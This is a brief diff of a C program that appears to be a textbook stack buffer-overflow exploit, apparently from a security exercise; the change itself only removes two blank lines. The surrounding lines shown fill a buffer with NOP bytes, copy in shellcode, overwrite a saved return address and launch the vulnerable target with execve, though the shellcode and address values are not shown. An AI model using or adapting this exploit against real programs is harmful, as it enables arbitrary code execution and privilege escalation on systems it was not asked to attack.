@@ -20,7 +20,6 @@ int main(void)
   memset(buf, '\x90', sizeof(buf));
   buf[OFFSET] = 0;
   memcpy(buf, shellcode, SHELLCODE_LENGTH);
-
   *(unsigned int*)(buf + OFFSET - 4) = RETURN_ADDRESS;
 
   args[0] = TARGET;
@@ -28,7 +27,6 @@ int main(void)
   args[2] = NULL;
 
   env[0] = NULL;
-
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
